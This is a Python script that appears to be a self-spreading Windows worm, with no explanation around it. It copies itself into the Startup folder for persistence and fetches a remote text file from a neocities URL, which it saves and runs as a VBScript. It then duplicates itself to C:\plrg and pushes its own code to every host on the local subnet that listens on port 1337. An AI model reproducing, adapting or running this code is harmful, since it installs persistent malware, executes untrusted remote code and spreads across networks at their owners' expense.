import os
import shutil
import sys
import random
import urllib
import subprocess
import socket
import string

# Get the current script's path
currentScript = sys.argv[0]

# Declare the destination file path
destFile = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sancho.py'

# Use the shutil library to copy the current script to the destination path
shutil.copy2(currentScript, destFile)

# The link from which to copy text
link = "https://thekoolestklub.neocities.org/sugu.txt"

# Open the link and read the contents
with urllib.request.urlopen(link) as response:
    webContent = response.read()

# Decode the contents
webContent = webContent.decode()

# Generate a random string to be used as the file name
file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))+'.vbs'

# Save the contents to a file
with open(file_name, "w") as f:
    f.write(webContent)
    
subprocess.run(["start", file_name], shell=True)
    
# Get the current file's path
file_path = os.path.abspath(__file__)
 
# Open the file
with open(file_path, 'rb') as f:
    file_data = f.read()
 
# Generate a random string for the file name
file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
 
# Get the path of the copied file
copied_file_path = os.path.join("C:\\plrg", file_name)
 
# Check if the directory exists, create it if it doesn't
if not os.path.exists(os.path.dirname(copied_file_path)):
    os.makedirs(os.path.dirname(copied_file_path))
 
# Save the received data to the new file
with open(copied_file_path, "wb") as f:
    f.write(file_data)
 
# Open the copied file using the appropriate command
subprocess.run(["start", copied_file_path], shell=True)
 
# Get the local IP address
ip = socket.gethostbyname(socket.gethostname())
 
# Get the subnet
subnet = '.'.join(ip.split('.')[:-1]) + '.'
 
# Iterate through all IP addresses in the subnet
for i in range(1, 256):
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the IP address
        s.connect((subnet + str(i), 1337))
        # Send the file data
        s.sendall(file_data)
        # Save the received data to a new file
        with open(copied_file_path, "wb") as f:
            f.write(file_data)
        # Close the socket
        s.close()
    except:
        # If the connection fails, move on to the next IP
        pass